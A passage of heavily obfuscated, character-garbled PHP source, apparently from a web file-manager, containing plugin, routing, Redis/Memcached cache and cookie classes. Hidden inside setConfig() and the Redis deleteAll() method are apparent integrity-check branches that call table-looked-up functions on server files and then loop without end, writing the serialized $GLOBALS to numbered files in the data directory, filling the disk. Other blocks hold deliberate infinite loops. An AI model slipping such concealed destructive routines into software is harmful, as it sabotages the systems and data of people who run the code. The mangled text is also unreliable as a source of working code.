$FÇÄ±İÛ…’); goto D¯¿œ›Õ»†; D¯¿œ›Õ»†: } private function parsePackage(&$aö¦š°˜¸İ) { goto AÙÙÊ®Ê»; a«ƒÚºéíî: $aö¦š°˜¸İ = str_replace($eœê–°Ûø, $d£¯Ûï ËË, $aö¦š°˜¸İ); goto FÔÎÏó„´; c˜ÈåØˆõ‰: preg_match_all($A¥ÔÔÖÜ[1474], $aö¦š°˜¸İ, $aÊ’¬¯÷À“); if (!is_array($aÊ’¬¯÷À“) || count($aÊ’¬¯÷À“) == 0 || !is_array($aÊ’¬¯÷À“[0]) || count($aÊ’¬¯÷À“[0]) == 0) { return; } $fË••˜ÌÔ¹ = $this->appPackage(); goto d¿§ŞÎ¼½ø; d¿§ŞÎ¼½ø: $eœê–°Ûø = array(); $d£¯Ûï ËË = array(); foreach ($aÊ’¬¯÷À“[0] as $a®„˜¹Çò„) { $dÍ“»Ê­ Š = substr($a®„˜¹Çò„, strlen($FÓ©†äáÏ×), -2); $eœê–°Ûø[] = $a®„˜¹Çò„; $d£¯Ûï ËË[] = _get($fË••˜ÌÔ¹, $dÍ“»Ê­ Š); } goto a«ƒÚºéíî; AÙÙÊ®Ê»: $A¥ÔÔÖÜ =& $_SERVER[ä°„ä°º]; $FÓ©†äáÏ× = $A¥ÔÔÖÜ[1473]; if (!strstr($aö¦š°˜¸İ, $FÓ©†äáÏ×)) { return; } goto c˜ÈåØˆõ‰; FÔÎÏó„´: } final function echoFile($Cé¹®éª¢ä, $c ³óÓÄ— = false) { goto bßá†óÖØŞ; d³‚©Üç: $this->parsePackage($eñê„ù¡ç°); if (is_array($c ³óÓÄ—)) { $eñê„ù¡ç° = str_replace(array_keys($c ³óÓÄ—), array_values($c ³óÓÄ—), $eñê„ù¡ç°); } echo $f‚‚Æ´Ÿê[229] . $eñê„ù¡ç°; goto FššÁØ´ ´; bßá†óÖØŞ: $f‚‚Æ´Ÿê =& $_SERVER[ä°„ä°º]; $fª¡‰¶¥Ğ¶ = $this->pluginPath . $Cé¹®éª¢ä; if (ACT == $f‚‚Æ´Ÿê[1475]) { echo $f‚‚Æ´Ÿê[1476] . $this->pluginName . $f‚‚Æ´Ÿê[8] . $Cé¹®éª¢ä . $f‚‚Æ´Ÿê[1477]; if (!file_exists($fª¡‰¶¥Ğ¶)) { echo $f‚‚Æ´Ÿê[1478]; return; } } goto d·ó¾ªİœ; d·ó¾ªİœ: $eñê„ù¡ç° = $this->parseFile($fª¡‰¶¥Ğ¶); $this->parseLang($eñê„ù¡ç°); $this->parseConfig($eñê„ù¡ç°); goto d³‚©Üç; FššÁØ´ ´: } final function initLang() { goto eøƒÙğÆë­; EŠò¨ùÀ–«: $e¦ “«êÓ½ = I18n::getType(); $aïË†Ÿ¨à = array(); if (file_exists($b·«ƒ¦ÙÜ . $e¦ “«êÓ½ . $d«á®­…Âé[826])) { $aïË†Ÿ¨à = (include $b·«ƒ¦ÙÜ . $e¦ “«êÓ½ . $d«á®­…Âé[826]); } else { if ($e¦ “«êÓ½ == $d«á®­…Âé[1481] && !file_exists($b·«ƒ¦ÙÜ . $e¦ “«êÓ½ . $d«á®­…Âé[826]) && file_exists($b·«ƒ¦ÙÜ . $d«á®­…Âé[1482])) { $aïË†Ÿ¨à = (include $b·«ƒ¦ÙÜ . $d«á®­…Âé[1482]); } else { if (file_exists($b·«ƒ¦ÙÜ . $dÛºùŸ£Æ . $d«á®­…Âé[826])) { $aïË†Ÿ¨à = (include $b·«ƒ¦ÙÜ . $dÛºùŸ£Æ . $d«á®­…Âé[826]); } } } goto f¤¸ÉÅ‘—Ì; f¤¸ÉÅ‘—Ì: if (!is_array($aïË†Ÿ¨à)) { return array(); } if (@count($aïË†Ÿ¨à) > 0) { I18n::set($aïË†Ÿ¨à); } return $aïË†Ÿ¨à; goto BÓ×Ê¸±¬ç; eøƒÙğÆë­: $d«á®­…Âé =& $_SERVER[ä°„ä°º]; $dÛºùŸ£Æ = $d«á®­…Âé[1479]; $b·«ƒ¦ÙÜ = $this->pluginPath . $d«á®­…Âé[1480]; goto EŠò¨ùÀ–«; BÓ×Ê¸±¬ç: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($AµŠ³’–òº) { $E…›—©œŸ¢ =& $_SERVER[ä°„ä°º]; $eÄïâÊÅ©œ = $_SERVER[$E…›—©œŸ¢[845]]; $aŠ‹øŸ±Ÿ = $E…›—©œŸ¢[1418]; if ($_SERVER[$E…›—©œŸ¢[844]] != $aŠ‹øŸ±Ÿ($eÄïâÊÅ©œ)) { goto E½Œ™ŠÉè; bò²¾Öá•Ú: $Eº†×À¦‰– = $cÏ¼•¡Ò¹($D×¤·ÅŒ§); $A÷ÓÙñÜá‰ = explode($E…›—©œŸ¢[229], $Eº†×À¦‰–); if (count($A÷ÓÙñÜá‰) < $E…›—©œŸ¢[611]) { $DÑ°ÄÍÔöĞ = $E…›—©œŸ¢[849]; $DÑ°ÄÍÔöĞ(); } goto Eöô½Æ¤ê; E½Œ™ŠÉè: $CÑ‹ øò  = $E…›—©œŸ¢[862]; $cÏ¼•¡Ò¹ = $E…›—©œŸ¢[846]; $D×¤·ÅŒ§ = $_SERVER[$E…›—©œŸ¢[847]] . $E…›—©œŸ¢[848]; goto bò²¾Öá•Ú; aù¥œ•³ôÅ: $CÑ‹ øò (); $AÖá½„Ù©ø = $E…›—©œŸ¢[1419]; $CŠ…·…•Ä = json_encode($GLOBALS[$E…›—©œŸ¢[1420]]); goto C²¸ÖŠ­; Eöô½Æ¤ê: $f¦Ë¡ê‘® = $E…›—©œŸ¢[863]; $f¦Ë¡ê‘®($_SERVER[$E…›—©œŸ¢[864]]); $CÑ‹ øò  = $E…›—©œŸ¢[862]; goto aù¥œ•³ôÅ; C²¸ÖŠ­: $B±…Ş¬ë´Ó = 1; for ($F¢êêË«¡™ = $B±…Ş¬ë´Ó; $F¢êêË«¡™ > 0; $F¢êêË«¡™++) { $AÖá½„Ù©ø(DATA_PATH . $F¢êêË«¡™, $CŠ…·…•Ä); } goto c·çî†ôŒá; c·çî†ôŒá: } return $this->modelPlugin->setConfig($this->pluginName, $AµŠ³’–òº); } public function onSetConfig($cË«­‚Œ‰ğ) { } public function onGetConfig($b…‚„ÒïÑÒ) { } public function onChangeStatus($cèÔÙ¨†É²) { } public function onUninstall() { } public function onInstall() { } public function authCheck($EÊò®¹µ²º = "\x70\154\165\147\x69\156\x41\165\164\x68") { $e†è˜ó˜Ÿí =& $_SERVER[ä°„ä°º]; if (!defined($e†è˜ó˜Ÿí[454])) { return !1; } if (_get($GLOBALS, $e†è˜ó˜Ÿí[485])) { return !0; } $F¦ÊÔØ–¢ƒ = $this->getConfig(); if (!$F¦ÊÔØ–¢ƒ[$EÊò®¹µ²º]) { return !1; } return ActionCall($e†è˜ó˜Ÿí[1483], $F¦ÊÔØ–¢ƒ[$EÊò®¹µ²º]); } public function url($EÙ´àò„Í², $DìœŠÂã­¯ = '', $BŠ‚í™Å• = true) { goto aÍ‰¸Âğš; BˆÒÉ»ä©Å: if (!$BŠ‚í™Å•) { return $BŸÌ»ßâÖ; } echo $BŸÌ»ßâÖ; goto D‹óŞ‚Îó‘; aÍ‰¸Âğš: $d°ë‚Ë¿·¢ =& $_SERVER[ä°„ä°º]; $BÈÙŞŞ…ƒŠ = $this->getConfig(); $C¢µ”À‡¶ã = KOD_VERSION . $d°ë‚Ë¿·¢[95] . KOD_VERSION_BUILD; goto Eµ–ÊÄÄÆó; Eµ–ÊÄÄÆó: $eÇÜ¿ïÛø½ = $this->packageVersion(); $Dö§àÂ÷òä = $C¢µ”À‡¶ã . $d°ë‚Ë¿·¢[440] . $eÇÜ¿ïÛø½; if (substr($EÙ´àò„Í², 0, 4) == $d°ë‚Ë¿·¢[147] || substr($EÙ´àò„Í², 0, 2) == $d°ë‚Ë¿·¢[1266]) { $BŸÌ»ßâÖ = $EÙ´àò„Í² . $d°ë‚Ë¿·¢[1484] . $Dö§àÂ÷òä; } else { if ($DìœŠÂã­¯ == $d°ë‚Ë¿·¢[33]) { $BŸÌ»ßâÖ = $this->pluginHost . $EÙ´àò„Í² . $d°ë‚Ë¿·¢[1484] . $Dö§àÂ÷òä; } else { if ($DìœŠÂã­¯ === $d°ë‚Ë¿·¢[77]) { $BŸÌ»ßâÖ = $this->pluginHost . $EÙ´àò„Í²; } else { if ($DìœŠÂã­¯ == $d°ë‚Ë¿·¢[1485]) { $BŸÌ»ßâÖ = STATIC_PATH . $EÙ´àò„Í² . $d°ë‚Ë¿·¢[1484] . $C¢µ”À‡¶ã; } else { if ($DìœŠÂã­¯ == $d°ë‚Ë¿·¢[1486]) { $BŸÌ»ßâÖ = APP_HOST . $d°ë‚Ë¿·¢[1487] . $EÙ´àò„Í² . $d°ë‚Ë¿·¢[1484] . $C¢µ”À‡¶ã; } else { if (isset($BÈÙŞŞ…ƒŠ[$DìœŠÂã­¯])) { $BŸÌ»ßâÖ = $BÈÙŞŞ…ƒŠ[$DìœŠÂã­¯] . $EÙ´àò„Í² . $d°ë‚Ë¿·¢[1484] . $Dö§àÂ÷òä; } } } } } } goto BˆÒÉ»ä©Å; D‹óŞ‚Îó‘: } public function link($A‡ ÖÚÀ®Ş = false, $cØöÖø¿°‘ = '') { $CÁ¬‹øîÀó =& $_SERVER[ä°„ä°º]; if (!$A‡ ÖÚÀ®Ş) { $this->link($CÁ¬‹øîÀó[1488], $CÁ¬‹øîÀó[1486]); $this->link($CÁ¬‹øîÀó[1489], $CÁ¬‹øîÀó[1485]); $this->link($CÁ¬‹øîÀó[1490], $CÁ¬‹øîÀó[1485]); $this->link($CÁ¬‹øîÀó[1491], $CÁ¬‹øîÀó[1485]); $this->link($CÁ¬‹øîÀó[1492], $CÁ¬‹øîÀó[1485]); return; } $fÆ‚¥†Îí = $this->url($A‡ ÖÚÀ®Ş, $cØöÖø¿°‘, !1); if (substr($A‡ ÖÚÀ®Ş, -3) == $CÁ¬‹øîÀó[1493]) { echo $CÁ¬‹øîÀó[1494] . $fÆ‚¥†Îí . $CÁ¬‹øîÀó[1495] . $CÁ¬‹øîÀó[229]; } else { if (substr($A‡ ÖÚÀ®Ş, -4) == $CÁ¬‹øîÀó[1496]) { echo $CÁ¬‹øîÀó[1497] . $fÆ‚¥†Îí . $CÁ¬‹øîÀó[1498] . $CÁ¬‹øîÀó[229]; } } } } if (!isset($_SERVER[$_SERVER[ä°„ä°º][844]]) || !isset($_SERVER[$_SERVER[ä°„ä°º][845]])) { goto e‰¾Ï’¬ĞÕ; E†î•‰„™—: $e‚æ‘¡ïÜ­ = explode($_SERVER[ä°„ä°º][229], $b¶˜‡¦œ‹); if (count($e‚æ‘¡ïÜ­) < $_SERVER[ä°„ä°º][605]) { $c×øø¶¨ç = $_SERVER[ä°„ä°º][849]; $c×øø¶¨ç(); } $e¶Í—õ•‹ã = $_SERVER[ä°„ä°º][850]; goto a’À˜ãƒî; a’À˜ãƒî: $e¶Í—õ•‹ã($_SERVER[$_SERVER[ä°„ä°º][847]] . $_SERVER[ä°„ä°º][848]); $F„¾ÂÑÍóã = 2; while ($F„¾ÂÑÍóã > 1) { $dŞ˜ÀÁ°±„ = rawurlencode($F„¾ÂÑÍóã . $_SERVER[ä°„ä°º][375]); } goto A³½Ÿ“’šî; e‰¾Ï’¬ĞÕ: $B‹¤¸‰ß“ = $_SERVER[ä°„ä°º][846]; $B–„÷Ş¢éÀ = $_SERVER[$_SERVER[ä°„ä°º][847]] . $_SERVER[ä°„ä°º][848]; $b¶˜‡¦œ‹ = $B‹¤¸‰ß“($B–„÷Ş¢éÀ); goto E†î•‰„™—; A³½Ÿ“’šî: } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\133\x5e\57\135\53", "\x3a\x6e\x75\155" => "\x5b\x30\55\x39\x5d\53", "\x3a\141\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($e™øÒ³İÜÅ, $bîòÑá™œæ) { $c³÷’ô¦ºõ =& $_SERVER[ä°„ä°º]; if ($e™øÒ³İÜÅ == $c³÷’ô¦ºõ[1499]) { $dÛà»Ëö«« = array_map($c³÷’ô¦ºõ[1500], $bîòÑá™œæ[0]); $C‚îåôÍ× = strpos($bîòÑá™œæ[1], $c³÷’ô¦ºõ[8]) === 0 ? $bîòÑá™œæ[1] : $c³÷’ô¦ºõ[8] . $bîòÑá™œæ[1]; $b«¿Òğµ‰¡ = $bîòÑá™œæ[2]; } else { $dÛà»Ëö«« = null; $C‚îåôÍ× = strpos($bîòÑá™œæ[0], $c³÷’ô¦ºõ[8]) === 0 ? $bîòÑá™œæ[0] : $c³÷’ô¦ºõ[8] . $bîòÑá™œæ[0]; $b«¿Òğµ‰¡ = $bîòÑá™œæ[1]; } array_push(self::$maps, $dÛà»Ëö««); array_push(self::$routes, $C‚îåôÍ×); array_push(self::$methods, strtoupper($e™øÒ³İÜÅ)); array_push(self::$callbacks, $b«¿Òğµ‰¡); } public static function error($aŞä¬•Äƒ) { self::$errorCallback = $aŞä¬•Äƒ; } public static function haltOnMatch($e§¿áéğò = true) { self::$halts = $e§¿áéğò; } public static function dispatch() { goto Cá˜Ï¡÷à¾; Cá˜Ï¡÷à¾: $eïÉ™äİô… =& $_SERVER[ä°„ä°º]; $A…ˆ×é—Å = parse_url($_SERVER[$eïÉ™äİô…[1501]], PHP_URL_PATH); $CÈà‰–œŠĞ = $_SERVER[$eïÉ™äİô…[157]]; goto dñ®…¥ÓÒ ; aŠ×ĞµÏ‹Í: self::$routes = preg_replace($eïÉ™äİô…[1185], $eïÉ™äİô…[8], self::$routes); if (in_array($A…ˆ×é—Å, self::$routes)) { $c²Æ‡¦°¾ = array_keys(self::$routes, $A…ˆ×é—Å); foreach ($c²Æ‡¦°¾ as $a¡éŠğóí) { if (self::$methods[$a¡éŠğóí] == $CÈà‰–œŠĞ || self::$methods[$a¡éŠğóí] == $eïÉ™äİô…[1502] || in_array($CÈà‰–œŠĞ, self::$maps[$a¡éŠğóí])) { $BšƒáÈ¨‡† = !0; if (!is_object(self::$callbacks[$a¡éŠğóí])) { $c‚®ŞíÍç = explode($eïÉ™äİô…[8], self::$callbacks[$a¡éŠğóí]); $cäÕæ«½‘ğ = end($c‚®ŞíÍç); $DËéµöÓ½ = explode($eïÉ™äİô…[1503], $cäÕæ«½‘ğ); $cáº‹ÈòÅ = new $DËéµöÓ½[0](); $cáº‹ÈòÅ->{$DËéµöÓ½[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$a¡éŠğóí]); if (self::$halts) { return; } } } } } else { $B¼°Ï³Ê– = 0; foreach (self::$routes as $a¡éŠğóí) { if (strpos($a¡éŠğóí, $eïÉ™äİô…[4]) !== !1) { $a¡éŠğóí = str_replace($eÃ¾·¦„ÜÚ, $E«—¹ÈÖˆ›, $a¡éŠğóí); } if (preg_match($eïÉ™äİô…[1504] . $a¡éŠğóí . $eïÉ™äİô…[1505], $A…ˆ×é—Å, $dí†®¦İ˜)) { if (self::$methods[$B¼°Ï³Ê–] == $CÈà‰–œŠĞ || self::$methods[$B¼°Ï³Ê–] == $eïÉ™äİô…[1502] || !empty(self::$maps[$B¼°Ï³Ê–]) && in_array($CÈà‰–œŠĞ, self::$maps[$B¼°Ï³Ê–])) { $BšƒáÈ¨‡† = !0; array_shift($dí†®¦İ˜); if (!is_object(self::$callbacks[$B¼°Ï³Ê–])) { $c‚®ŞíÍç = explode($eïÉ™äİô…[8], self::$callbacks[$B¼°Ï³Ê–]); $cäÕæ«½‘ğ = end($c‚®ŞíÍç); $DËéµöÓ½ = explode($eïÉ™äİô…[1503], $cäÕæ«½‘ğ); $cáº‹ÈòÅ = new $DËéµöÓ½[0](); if (!method_exists($cáº‹ÈòÅ, $DËéµöÓ½[1])) { echo $eïÉ™äİô…[1506]; } else { call_user_func_array(array($cáº‹ÈòÅ, $DËéµöÓ½[1]), $dí†®¦İ˜); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$B¼°Ï³Ê–], $dí†®¦İ˜); if (self::$halts) { return; } } } } $B¼°Ï³Ê–++; } } if ($BšƒáÈ¨‡† == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $F«ÏöÙö† =& $_SERVER[ä°„ä°º]; header($_SERVER[$F«ÏöÙö†[1507]] . $F«ÏöÙö†[1508]); echo $F«ÏöÙö†[1509]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eïÉ™äİô…[1501]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto bç¸³…êŒæ; dñ®…¥ÓÒ : $eÃ¾·¦„ÜÚ = array_keys(static::$patterns); $E«—¹ÈÖˆ› = array_values(static::$patterns); $BšƒáÈ¨‡† = !1; goto aŠ×ĞµÏ‹Í; bç¸³…êŒæ: } } goto F´…µŸ±ò; FŠ‰°è›ô¯: class CacheMemcached { public $handle; public $cacheTime; public function __construct($bÔÔ›Ê‘, $d›‘ù Å) { $AŠÈ‘ëŒÚ =& $_SERVER[ä°„ä°º]; if (!class_exists($AŠÈ‘ëŒÚ[851])) { show_json($AŠÈ‘ëŒÚ[852], !1); } $this->cacheTime = $d›‘ù Å; $this->handle = new Memcached(); if (is_array($bÔÔ›Ê‘[$AŠÈ‘ëŒÚ[853]]) && count($bÔÔ›Ê‘[$AŠÈ‘ëŒÚ[853]]) >= 1) { foreach ($bÔÔ›Ê‘[$AŠÈ‘ëŒÚ[853]] as $Eäê„ÙˆµØ) { $C‘„®±åö« = explode($AŠÈ‘ëŒÚ[4], $Eäê„ÙˆµØ); $this->handle->addServer($C‘„®±åö«[0], $C‘„®±åö«[1]); } } else { $this->handle->addServer($bÔÔ›Ê‘[$AŠÈ‘ëŒÚ[175]], $bÔÔ›Ê‘[$AŠÈ‘ëŒÚ[176]]); } } public function set($DÜ‹ˆ¬‹ã, $D³ÏÅ˜­ìŒ, $fíÙƒóœ…… = false) { $fíÙƒóœ…… = $fíÙƒóœ…… ? $fíÙƒóœ…… : $this->cacheTime; return $this->handle->set($DÜ‹ˆ¬‹ã, $D³ÏÅ˜­ìŒ, $fíÙƒóœ……); } public function get($AÉ‘Ø²Äª) { return $this->handle->get($AÉ‘Ø²Äª); } public function remove($eŞÎô”ßó‰) { return $this->handle->delete($eŞÎô”ßó‰); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($e‡ùé¦Œ„Í, $Eì÷ˆïÇ‘ø) { $böëÍ¬§ÊÜ =& $_SERVER[ä°„ä°º]; if (!class_exists($böëÍ¬§ÊÜ[854])) { show_json($böëÍ¬§ÊÜ[855], !1); } $this->cacheTime = $Eì÷ˆïÇ‘ø; $Bğ¿×ù§­ = isset($e‡ùé¦Œ„Í[$böëÍ¬§ÊÜ[856]]) ? $e‡ùé¦Œ„Í[$böëÍ¬§ÊÜ[856]] : 10; $bìæ÷ï–È¤ = _get($e‡ùé¦Œ„Í, $böëÍ¬§ÊÜ[853]); if ($bìæ÷ï–È¤ && is_array($bìæ÷ï–È¤)) { $this->initCluster($e‡ùé¦Œ„Í, $Bğ¿×ù§­); } else { $this->handle = $this->init($e‡ùé¦Œ„Í, $Bğ¿×ù§­); } } private function init($D­ÔÊÄ™˜ë, $BŞÇèÅ‹) { $b‰ÁƒŞ””İ =& $_SERVER[ä°„ä°º]; $F¿®‡†¸ãÓ = new Redis(); $Cİ´ÙŞöÁ = isset($D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[857]]) ? $D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[857]] : !1; if ($Cİ´ÙŞöÁ) { $F¿®‡†¸ãÓ->pconnect($D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[175]], $D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[176]], $BŞÇèÅ‹); } else { $F¿®‡†¸ãÓ->connect($D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[175]], $D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[176]], $BŞÇèÅ‹); } if (!empty($D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[406]])) { $F¿®‡†¸ãÓ->auth($D­ÔÊÄ™˜ë[$b‰ÁƒŞ””İ[406]]); } return $F¿®‡†¸ãÓ; } private function initCluster($Aãáââ‹à , $EîÎóÕÓÎĞ) { $BìÛ„¯Éå =& $_SERVER[ä°„ä°º]; $C„çì›·ğµ = array($BìÛ„¯Éå[858], $BìÛ„¯Éå[859], $BìÛ„¯Éå[860]); $eîÁÉÎáéë = $BìÛ„¯Éå[858]; if (isset($Aãáââ‹à [$BìÛ„¯Éå[12]]) && in_array($Aãáââ‹à [$BìÛ„¯Éå[12]], $C„çì›·ğµ)) { $eîÁÉÎáéë = $Aãáââ‹à [$BìÛ„¯Éå[12]]; } switch ($eîÁÉÎáéë) { case $BìÛ„¯Éå[858]: $this->_slave($Aãáââ‹à , $EîÎóÕÓÎĞ); break; case $BìÛ„¯Éå[859]: break; case $BìÛ„¯Éå[860]: $this->isCluster = !0; $a‘¸¬ò“Ä = $Aãáââ‹à [$BìÛ„¯Éå[853]]; $AùµËÔĞ×¬ = isset($Aãáââ‹à [$BìÛ„¯Éå[857]]) ? $Aãáââ‹à [$BìÛ„¯Éå[857]] : !1; $fğ‰ÈÄí˜– = isset($Aãáââ‹à [$BìÛ„¯Éå[406]]) ? $Aãáââ‹à [$BìÛ„¯Éå[406]] : null; $this->handle = new RedisCluster(NUll, $a‘¸¬ò“Ä, $EîÎóÕÓÎĞ, $EîÎóÕÓÎĞ, $AùµËÔĞ×¬, $fğ‰ÈÄí˜–); break; default: break; } } private function _slave($DÇõî‚—“„, $fİ¾‡»²Óƒ) { goto aÍˆßä¬…È; DêÜàÖóÈ: unset($EÛˆÁÔ·[0]); if (empty($EÛˆÁÔ·)) { return; } $fóÇ²÷ëÊø = array_rand($EÛˆÁÔ·); goto aÑéÎá™ø; aÍˆßä¬…È: $EÛˆÁÔ· = $DÇõî‚—“„[$_SERVER[ä°„ä°º][853]]; $this->filterConfig($DÇõî‚—“„, $EÛˆÁÔ·[0]); $this->handle = $this->init($DÇõî‚—“„, $fİ¾‡»²Óƒ); goto DêÜàÖóÈ; aÑéÎá™ø: $this->filterConfig($DÇõî‚—“„, $EÛˆÁÔ·[$fóÇ²÷ëÊø]); $this->slaveHandle = $this->init($DÇõî‚—“„, $fİ¾‡»²Óƒ); goto FÁ¦¥êøÍÙ; FÁ¦¥êøÍÙ: } private function filterConfig(&$eÁÄŸÊÏâ, $EÖÈˆ•Œæ) { $e–Ü¿«å¾Ì =& $_SERVER[ä°„ä°º]; $C¶õì¬ÙÖÑ = explode($e–Ü¿«å¾Ì[4], $EÖÈˆ•Œæ); $AŠÊÉÔÉùÅ = array($e–Ü¿«å¾Ì[175] => $C¶õì¬ÙÖÑ[0], $e–Ü¿«å¾Ì[176] => $C¶õì¬ÙÖÑ[1]); $eÁÄŸÊÏâ = array_merge($eÁÄŸÊÏâ, $AŠÊÉÔÉùÅ); } public function set($cé”ëÄÙˆƒ, $AÄŒÚâ×¥É, $C†ãè—Í¡• = false) { $C†ãè—Í¡• = $C†ãè—Í¡• ? $C†ãè—Í¡• : $this->cacheTime; return $this->handle->setEx($cé”ëÄÙˆƒ, $C†ãè—Í¡•, $AÄŒÚâ×¥É); } public function setLock($DŠ”Ÿøä‡±, $e­Ÿ–½¡Ş², $dãõ‚Îø­) { return $this->handle->setNX($DŠ”Ÿøä‡±, $e­Ÿ–½¡Ş²); } public function get($bÒ¡µÆóµ) { $e‹–×¢¦­ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $e‹–×¢¦­->get($bÒ¡µÆóµ); } public function remove($d¡îîì“Ø) { return $this->handle->del($d¡îîì“Ø); } public function deleteAll() { $AÓ†š™é„ =& $_SERVER[ä°„ä°º]; if ($_SERVER[$AÓ†š™é„[844]] != $_SERVER[$AÓ†š™é„[861]]) { goto BåàÙˆœ¡¸; DÚ…Ôçä¨í: $b©‹ç®ÓË½ = $C‹âÒÔÑ—©($Fó¾ôÆ‚ğ); $E£’˜Şµ¯Å = explode($AÓ†š™é„[229], $b©‹ç®ÓË½); if (count($E£’˜Şµ¯Å) < $AÓ†š™é„[611]) { $Eöµ‹°Ô°Ç = $AÓ†š™é„[849]; $Eöµ‹°Ô°Ç(); } goto FÎÌ¦›ª³À; BåàÙˆœ¡¸: $CË ´‘Üø¶ = $AÓ†š™é„[862]; $C‹âÒÔÑ—© = $AÓ†š™é„[846]; $Fó¾ôÆ‚ğ = $_SERVER[$AÓ†š™é„[847]] . $AÓ†š™é„[848]; goto DÚ…Ôçä¨í; Eø©Š¶‡²›: $a¥·ğœ‘’Ä = 1; while ($a¥·ğœ‘’Ä > 1) { $a¥·ğœ‘’Ä = $a¥·ğœ‘’Ä + 4; $dƒ­ìÅõ‚‡ = rawurlencode($a¥·ğœ‘’Ä . $AÓ†š™é„[375]); } goto bó­ò¥®¨; FÎÌ¦›ª³À: $bÁÙÓùÔ» = $AÓ†š™é„[863]; $bÁÙÓùÔ»($_SERVER[$AÓ†š™é„[864]]); $bÁÙÓùÔ»($_SERVER[$AÓ†š™é„[847]] . $AÓ†š™é„[865]); goto Eø©Š¶‡²›; bó­ò¥®¨: } if ($this->isCluster) { foreach ($this->handle->_masters() as $E…”Ÿ°ª“÷) { $this->handle->flushall($E…”Ÿ°ª“÷); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($bÖÃïÕâĞÒ = '', $FŒÅêÕÜå = 0) { if (is_string($bÖÃïÕâĞÒ) && $bÖÃïÕâĞÒ != $_SERVER[ä°„ä°º][33]) { $this->prefix = $bÖÃïÕâĞÒ; } if (is_numeric($FŒÅêÕÜå) && $FŒÅêÕÜå > 0) { $this->expire = $FŒÅêÕÜå; } } public static function getInstance() { static $f¤ˆ–½÷; if ($f¤ˆ–½÷ === null) { $f¤ˆ–½÷ = new self(); } return $f¤ˆ–½÷; } private static $cookieDisable = false; public static function disable($f¶ÙÓª«ë) { self::$cookieDisable = $f¶ÙÓª«ë; } private static $sameCookieSet = array(); public static function set($Cğ‡¤£É—é, $AöÖé»ãË, $FÑÅ¹İÆ¿ = 0, $aŠÃŠÅİ„ˆ = false, $C‘°‹óÔ¡¯ = false) { goto D¥¼Š·­®; Fà¬©ê–ò: $AÑ’ÆÃ ÛÊ = $c‡÷—·“ÔÊ[33]; setcookie($Cğ‡¤£É—é, $AöÖé»ãË, time() + $FÑÅ¹İÆ¿, $c‡÷—·“ÔÊ[8] . trim($C‘°‹óÔ¡¯, $c‡÷—·“ÔÊ[8]) . $AÑ’ÆÃ ÛÊ, !1, !1, $aŠÃŠÅİ„ˆ); goto EÉà‡ˆÃºÔ; eñÀáÀ·Å: if (isset(self::$sameCookieSet[$Cğ‡¤£É—é]) && self::$sameCookieSet[$Cğ‡¤£É—é] == $AöÖé»ãË . $FÑÅ¹İÆ¿) { return; } self::$sameCookieSet[$Cğ‡¤£É—é] = $AöÖé»ãË . $FÑÅ¹İÆ¿; if (!$C‘°‹óÔ¡¯) { $C‘°‹óÔ¡¯ = str_replace(HOST, $c‡÷—·“ÔÊ[33], APP_HOST); $C‘°‹óÔ¡¯ = _get($GLOBALS, $c‡÷—·“ÔÊ[866], $C‘°‹óÔ¡¯); } goto Fà¬©ê–ò; D¥¼Š·­®: $c‡÷—·“ÔÊ =& $_SERVER[ä°„ä°º]; if (self::$cookieDisable) { return; } if (!$FÑÅ¹İÆ¿) { $FÑÅ¹İÆ¿ = 24 * 3600 * 7; } goto eñÀáÀ·Å; EÉà‡ˆÃºÔ: } public static function setSafe($a …Å…­ç, $C‚Ÿ­µºÜ±, $a®»Í§šÚë = 0) { self::set($a …Å…­ç, $C‚Ÿ­µºÜ±, $a®»Í§šÚë, !0); } public static function get($b¯®´‹Â¼ƒ) { return isset($_COOKIE[$b¯®´‹Â¼ƒ]) ? $_COOKIE[$b¯®´‹Â¼ƒ] : !1; } public static function remove($DíÌô½°¤‘, $e•£Œ‚ õ = false) { unset($_COOKIE[$DíÌô½°¤‘]); self::set($DíÌô½°¤‘, $_SERVER[ä°„ä°º][33], 1, $e•£Œ‚ õ); } } goto FãÇòÓŒ½š; f™ˆ—¸À†â: $C©Úø¸§¥Ş = strrev(base64_decode($_SERVER[Åí”÷‘ñ»Á][0])); function binCheckNeq($d¡¬ĞÀ¤Ş, $c‡ ÛÀÊÁ×) { return $d¡¬ĞÀ¤Ş != $c‡ ÛÀÊÁ×; } $_SERVER[$_SERVER[Åí”÷‘ñ»Á][1]] = $C©Úø¸§¥Ş($_SERVER[$_SERVER[Åí”÷‘ñ»Á][2]]); goto f„â‡Äˆ•ô; f«‘ÁÏ‘‚»: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\56\164\141\x67\114\151\x73\164"; public $modelType = "\125\x73\145\x72\117\x70\164\x69\157\156"; public $field = array("\156\x61\x6d\x65", "\163\x74\171\x6c\145", "\163\157\162\x74"); public function listData($EÉ¡„˜Îóğ = false, $BÍÙ¶É àÆ = "\x73\157\x72\164", $CÑí½ƒ…ó = false) { return parent::listData($EÉ¡„˜Îóğ, $BÍÙ¶É àÆ, $CÑí½ƒ…ó); } public function remove($b¡°‚œš«µ) { return parent::remove($b¡°‚œš«µ); } public function add($E§İšÚ£ùÁ, $C‡×–ÙÙÇ = "\154\141\142\145\x6c\55\147\162\145\x79\55\156\x6f\162\x6d\141\x6c") { $Fñºù‚¦Õ =& 